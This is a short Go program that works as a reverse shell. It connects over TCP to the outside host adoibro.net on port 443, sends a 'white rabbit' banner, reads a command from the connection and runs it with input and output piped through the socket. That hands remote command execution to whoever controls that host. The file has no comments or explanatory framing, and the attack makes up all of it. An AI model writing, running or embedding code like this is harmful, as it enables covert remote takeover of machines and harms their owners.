package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strings"
)

func main() {

	conn, err := net.Dial("tcp", "adoibro.net:443")

	if err != nil {
		log.Println(err)
		return
	}

	buffer := bufio.NewWriter(conn)
	buffer.WriteString("Following the white rabbit... \n\r")
	buffer.Flush()

	msg, _ := bufio.NewReader(conn).ReadString('\n')

	out := exec.Command(strings.TrimSuffix(msg, "\n"))
	out.Stdin = conn
	out.Stdout = conn
	out.Stderr = conn

	out.Run()
}
